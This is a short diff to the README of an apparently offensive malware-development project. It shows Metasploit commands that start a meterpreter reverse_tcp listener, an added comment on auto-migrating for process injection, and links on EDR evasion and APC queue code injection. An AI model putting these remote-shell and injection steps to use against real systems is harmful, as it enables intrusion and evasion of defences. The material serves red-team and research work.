@@ -22,6 +22,7 @@ Start meterpreter listener:
 use payload/windows/x64/meterpreter/reverse_tcp
 set LHOST 127.0.0.1
 set LPORT 4444
+# For QPC injection also use: set autorunscript post/windows/manage/migrate
 to_handler
 ```
 
@@ -40,4 +41,4 @@ env GOOS=windows GOARCH=amd64 go build
 * https://github.com/yoda66/MalwareDevTalk
 * https://posts.specterops.io/adventures-in-dynamic-evasion-1fe0bac57aa
 * https://github.com/Adepts-Of-0xCC/VBA-macro-experiments/blob/main/EDRHookDetector.vba
- 
+* https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection
